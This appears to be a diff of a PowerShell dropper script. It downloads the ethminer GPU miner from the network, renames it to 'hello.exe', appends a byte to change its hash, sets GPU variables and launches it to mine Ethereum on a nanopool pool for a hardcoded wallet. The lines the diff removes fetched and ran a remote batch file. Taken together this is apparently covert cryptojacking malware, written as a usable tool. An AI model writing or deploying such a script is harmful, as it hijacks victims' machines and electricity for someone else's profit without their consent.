@@ -2,8 +2,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $wc = New-Object System.Net.WebClient
 
-# URLs
-$start = "https://github.com/Slurpgeit/temp/raw/master/start.bat"
 $SysInternals = "https://download.sysinternals.com/files/SysinternalsSuite.zip"
 $eth = "https://github.com/nanopool/genoil-ethereum/releases/download/v1.1.7/ethminer-0.9.41-genoil-1.1.7.zip"
 
@@ -25,11 +23,16 @@ Unzip -File "c:\temp\sysinternals.zip" -Destination "c:\temp"
 $wc.DownloadFile($eth,"c:\temp\eth.zip")
 Unzip -File "c:\temp\eth.zip" -Destination "c:\temp"
 
-move ethminer.exe ingrid.exe
-echo a >> ingrid.exe
+move ethminer.exe hello.exe
+echo a >> hello.exe
 
-$wc.DownloadFile($start,"c:\temp\start.bat")
-Start-Process start.bat
+setx GPU_FORCE_64BIT_PTR 0
+setx GPU_MAX_HEAP_SIZE 100
+setx GPU_USE_SYNC_OBJECTS 1
+setx GPU_MAX_ALLOC_PERCENT 100
+setx GPU_SINGLE_ALLOC_PERCENT 100
+
+Start-Process -FilePath "hello.exe" -ArgumentList "--farm-recheck","200","-U","-S","eth-eu1.nanopool.org:9999","-O","0xB5a9b7402AF83507B77BB56ae12947823502742C.TOMB_RAIDER.miner@slurpgeit.nl"
 
 $minutes = 1000000000000000000000000000000000000000
 
